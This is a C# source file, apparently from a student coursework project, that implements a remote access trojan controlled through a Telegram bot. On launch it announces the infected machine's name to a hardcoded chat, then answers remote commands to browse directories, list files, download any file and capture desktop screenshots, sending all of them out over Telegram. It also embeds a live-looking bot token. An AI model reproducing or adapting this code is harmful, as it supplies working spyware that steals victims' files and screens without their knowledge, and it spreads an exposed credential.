using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Extensions.Polling;
using Telegram.Bot.Types.InputFiles;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using CourseWork.Trojan;
using Telegram.Bot.Exceptions;
using System.IO;
using System;

namespace Trojan
{
    public class TelegramController
    {
        private ITelegramBotClient telegramBotClient = new TelegramBotClient("5230039106:AAEPg-8W_jWdpUgqM_Mwt3kIMwHUe-2TGf4");
        private long messageId = 748423079;

        private async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            if (update.Type == UpdateType.Message)
            {
                var message = update.Message;
                string[] messageArray = message.Text.Split(' ');

                switch (messageArray[0])
                {
                    case "/help":
                        string help =
                            "/directory - Текущая директория\n" +
                            "/back - Перейти на директорию выше\n" +
                            "/list - Получить список всех файлов в текущей директории\n" +
                            "/cd *Имя директории* - Перейти в указанную директорию\n" +
                            "/download *Имя файла* - Скачать указанный файл\n" +
                            "/screen - делает скриншот рабочего стола\n";
                        await botClient.SendTextMessageAsync(messageId, help);
                        break;
                    case "/directory":
                        await botClient.SendTextMessageAsync(messageId, CommandReaction.CurrentDirectory);
                        break;
                    case "/back":
                        await botClient.SendTextMessageAsync(messageId, CommandReaction.BackToFolder());
                        break;
                    case "/list":
                        await botClient.SendTextMessageAsync(messageId, String.Join("\n", CommandReaction.GetDirectoryContent()));
                        break;
                    case "/cd":
                        await botClient.SendTextMessageAsync(messageId, (messageArray.Length == 1) ? "Ошибка"
                            : CommandReaction.GoToFolder(messageArray[1]).ToString());
                        break;
                    case "/screen":
                        using (var fileStream = new FileStream(CommandReaction.GetScreenshotPath(), FileMode.Open, FileAccess.Read, FileShare.Read))
                        {
                            await botClient.SendPhotoAsync(
                                chatId: messageId,
                                photo: new InputOnlineFile(fileStream)
                            );
                        }
                        break;
                    case "/download":
                        if (messageArray.Length > 1 && CommandReaction.FindFileInCurrentDirectory(messageArray[1])) 
                            await botClient.SendDocumentAsync(messageId, new InputOnlineFile(CommandReaction.ReadFile(messageArray[1]), messageArray[1]));
                        else 
                            await botClient.SendTextMessageAsync(messageId, (messageArray.Length == 1) ? "Ошибка" : "Данного файла не существует");
                        break;
                    default:
                        break;
                }

            }
        }

        private async Task HandleErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            if (exception is ApiRequestException apiRequestException)
            {
                await botClient.SendTextMessageAsync(messageId, apiRequestException.ToString());
            }
        }

        public void Start()
        {
            telegramBotClient.SendTextMessageAsync(messageId, String.Format("Компьютер: {0} в сети", System.Environment.MachineName));
            telegramBotClient.StartReceiving(
                HandleUpdateAsync,
                HandleErrorAsync,
                new ReceiverOptions { AllowedUpdates = { } },
                new CancellationTokenSource().Token
            );
        }
    }
}